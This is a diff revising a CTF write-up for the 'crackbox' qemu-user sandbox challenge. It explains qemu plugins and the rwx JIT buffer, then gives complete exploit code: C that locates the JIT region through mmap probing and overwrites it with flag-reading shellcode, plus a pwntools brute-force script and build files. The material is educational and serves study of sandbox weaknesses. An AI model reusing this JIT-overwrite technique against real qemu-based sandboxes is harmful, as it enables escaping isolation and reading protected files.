@@ -1,9 +1,12 @@
-***
+0 solves / 505 points
+> Author: unvariant
+> Just another restricted qemu-user sandbox.
+
+___
 ***NOTE***: I didn't solve this challenge during the ctf. but I believe that writing a writeup and having hand-on experience is good in order to have a better understanding of the challenge and to learn the most from it!
 
-I started writing this writeup when i tried solving the challenge, ended it after the ctf ended.
+I started writing this writeup when I tried solving the challenge, ended it after the ctf ended.
 ___
-
 
 The first thing i did was i tried to run the script.
 # Blackbox testing
@@ -12,8 +15,6 @@ Let's take a look at what it does
 ```
 $ nc chal.amt.rs 1339
 program: aaaaaaaaaaa
-
-
 
 
 ```
@@ -49,13 +50,13 @@ Looking at the `run.sh` file provided with the challenge we can see that qemu is
 `./qemu -plugin ./libfilter.so ./chal`
 
 ### So what is a qemu plugin?
-Qemu works by translating our code in run time from the guest instruction set, to the host instruction set.
+Qemu works by translating our code in run time from the guest instruction set to the host instruction set.
 
 In user-mode emulation (like in the challenge) Qemu does that by using a JIT (just in time) compiler that does just that (called TCG) **REMEMBER THIS, IT WILL BE IMPORTANT LATER!.
 
 A plugin is a piece of code that runs when that translation happens.
 
-*An important thing to note is that this plugin runs before the translated code is executed, believe me, i tried :(
+*An important thing to note is that this plugin runs before the translated code is executed, believe me, I tried :(
 ### How does a plugin operate
 ```c
  * The general life-cycle of a plugin is:
@@ -173,16 +174,28 @@ That seems unimportant to me, but maybe we will return to that later.
 ### Filter function
 After all of that we call the filter function, it seems like IDA struggles to decompile it so let's look at the assembly code:
 
-![[Pasted image 20240406135930.png]]
+```nasm
+public filter
+filter proc near
 
-So this just turns on the filter in `libfilter.so`.
+push    rbp
+mov     rbp, rsp
+mov     eax, 6969h
+syscall
+nop
+pop rbp
+retn
 
+filter endp
+```
+
+So this just turns the filter in `libfilter.so` on.
 ### calling `ptr`
 after doing all of that we just execute our input as code.
 
 ## Exploiting this
 
-Our limitations in this challenge are such:\
+Our limitations in this challenge are such:
 We can only use these syscalls 
 ```
 0 - sys_read
@@ -193,8 +206,8 @@ We can only use these syscalls
 ```
 
 ### A few things we need to know before the exploit
-1. Qemu-user runs both the host and the guest in the same address-spaces, that's because it's not used as a sandbox in that mode
-2. The JIT is operationg using a gigantic area in memory, called `code_gen_buffer` with `rwx` permisisons. That code is used to translate every instruction.
+1. Qemu-user runs both the host and the guest in the same address-spaces, that's because it's not used as a sandbox in that mode.
+2. The JIT is operating using a gigantic area in memory, with `rwx` permisisons, called `code_gen_buffer`. That code is used to translate every instruction.
 3. While qemu does sanitize memory accesses for some syscalls (such as `sys_open`, `sys_openat`, `creat`, `link`, `linkat`, `unlinkat`, `execveat`, `chdir`, `mknod` and more... ) it doesn't check memory locations for mmap, also, they don't check direct memory accesses!
 
 Now that we know all of this, let's write the exploit
@@ -213,7 +226,6 @@ I created a lot of connections to get a general feel of where it is usually mapp
 after doing so I ran `sudo docker exec -it <container_id> /bin/sh`
 and inside `sh` i ran
 
-# FIX THIS
 ```
 / # grep -r rwx /proc/*/maps
 /proc/20095/maps:71fd2d205000-71fd35204000 rwxp 00000000 00:00 0
@@ -232,7 +244,7 @@ I saw that it could end with 0xf7a000, and that it appears a lot
 ```
 so we could guess that it ends with it and filter on it!
 ___
-*NOTE*: for some reason that didn't work, I just ended up using the first mapped area i found and brute forcing that way :) it did show me that it started in 0x700000000000 though! (the author did find 0x4d5000 which does work)
+*NOTE*: for some reason that didn't work, I just ended up using the first mapped area I found and brute forcing that way :) it did show me that it started in 0x700000000000 though! (the author used 0x4d5000 which does work)
 ___
 ### Finding out what is in the JIT mapped area
 I ran the docker using ``
@@ -240,7 +252,7 @@ I ran the docker using ``
 sudo docker run --rm --privilaged -p 0.0.0.0:5000:5000 -it crackbox /bin/sh
 ```
 
-And in it i changed the `/srv/app/run` file to be
+And in it I changed the `/srv/app/run` file to be
 ```
 #!/bin/sh
 
@@ -286,13 +298,7 @@ Let's write our code!
 #include <sys/mman.h>
 #include <stdint.h>
 
-#define min(a,b) \
-   ({ __typeof__ (a) _a = (a); \
-       __typeof__ (b) _b = (b); \
-     _a < _b ? _a : _b; })
-
 #define NULL            ((void *)0)
-
 #define EEXIST          (17)
 
 #define SYS_read        (0)
@@ -303,7 +309,10 @@ Let's write our code!
 
 #define JIT_SEARCH_START (0x0000700000000000)
 #define JIT_SEARCH_END   (0x0000800000000000)
-#define BROAD_SEARCH_LENGTH (1 << 24)
+
+#define BROAD_SEARCH_LENGTH  (1 << 24)
+#define MID_SEARCH_LENGTH    (1 << 10)
+#define NARROW_SEARCH_LENGTH (1 << 3)
 
 
 void *memcpy(void *dst, const void *src, size_t n)
@@ -317,6 +326,7 @@ void *memcpy(void *dst, const void *src, size_t n)
     }
     return dst;
 }
+
 
 void *syscall(int syscall_number,
               void *arg1,
@@ -338,16 +348,11 @@ asm(
 "syscall\n"
 "ret");
 
-void write(char *buf, int length)
-{
-    syscall(SYS_write, 13, buf, length, NULL, NULL, NULL);
-    syscall(SYS_write, 13, "\n", 1, NULL, NULL, NULL);
-}
 
 void *search_memory(void *start, void *end, uint64_t length)
 {
     int i = 0;
-        void *ret;
+    void *ret;
     while (start < end)
     {
         ret = syscall(SYS_mmap,
@@ -370,40 +375,44 @@ void *search_memory(void *start, void *end, uint64_t length)
 
 void *search_for_jit()
 {
-    void *result = NULL;
-    void *start = JIT_SEARCH_START;
-    uint64_t length = 1 << 16;
+    void *result = JIT_SEARCH_START;
 
-    while (0xfb000 != ((uint64_t)result & 0xffffff))
-    {
-        start = search_memory(start, JIT_SEARCH_END, BROAD_SEARCH_LENGTH);
-        if (NULL == start)
-            return NULL;
+    result = search_memory(result, JIT_SEARCH_END, BROAD_SEARCH_LENGTH);
+    if (NULL == result)
+        // no mapped area found
+        return NULL;
 
-        result = search_memory(start, JIT_SEARCH_END, 1 << 4);
+    // narrowing down the search
+    result = search_memory(result, JIT_SEARCH_END, MID_SEARCH_LENGTH);
+    result = search_memory(result, JIT_SEARCH_END, NARROW_SEARCH_LENGTH);
 
-        start += BROAD_SEARCH_LENGTH; // incase we clash with another mapping
-    }
     return result;
 }
 
 __attribute__((section(".entry"))) int main()
 {
     void *jit_location;
-    char *shellcode = "\x48\x31\xF6\x56\x48\xBB\x67\x2E\x74\x78\x74\x00\x00\x00\x53\x48\xBB\x2F\x61\x70\x70\x2F\x66\x6C\x61\x53\x54\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x54\x5E\x48\xC7\xC2\x64\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x54\x5E\x48\xC7\xC7\x0D\x00\x00\x00\x48\xC7\xC2\x64\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05";
-    jit_location = search_for_jit();
-    write(&jit_location, 8);
 
-    memcpy((char *)jit_location + 0x40, shellcode, 93); 
+    char *shellcode = "\x48\x31\xF6\x56\x48\xBB\x67\x2E\x74\x78\x74\x00\x00\x00\x53\x48\xBB\x2F\x61\x70\x70\x2F\x66\x6C\x61\x53\x54\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x54\x5E\x48\xC7\xC2\x64\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x54\x5E\x48\xC7\xC7\x0D\x00\x00\x00\x48\xC7\xC2\x64\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05";
+
+    int shellcode_length = 93;
+
+    jit_location = search_for_jit();
+
+    if (NULL == jit_location)
+    {
+        // no mapped location found
+        return -1;
+    }
+
+    (void)memcpy((char *)jit_location + 0x2d, shellcode, shellcode_length);
 
     asm volatile("mov rax, %[jit_location]\n"
-                 "mov word ptr [rax + 0x18], 0x26eb\n" // jmp 0x28, jump to our shellcode
+                 "mov word ptr [rax + 0x14], 0x17eb\n" // jmp 0x17
                  :
                  : [jit_location] "r"(jit_location)
                  : "memory", "rax");
-    write("didn't work\n", sizeof("didn't work\n"));
 }
-
 ```
 
 and we get the flag!
@@ -448,8 +457,10 @@ mov rdx, 100
 mov rax, 1
 syscall
 ```
+I used this shellcode because at the start of the challenge the program closed `STDIN` fd. 
 
-my exploit python script
+
+`exploit.py`
 ```
 from pwn import *
 
@@ -457,17 +468,15 @@ data = open("script", "rb").read().ljust(0x10000, b"\x00")
 
 while True:
     con = remote("chal.amt.rs", 1339)
-    # con = remote("127.0.0.1", 5000)
     con.sendafter(b": ", data)
 
-    leak = int.from_bytes(con.read(8), byteorder='little')
-    print(hex(leak))
     try:
-        print(con.read(10))
+        print(con.read(1))
         con.interactive()
     except:
         con.close()
 ```
+
 
 `makefile`
 ``` title="makefile"
@@ -486,6 +495,7 @@ script: script.c
 run: script exploit.py
 	python3 exploit.py
 ```
+
 
 `linker.ld`
 ```
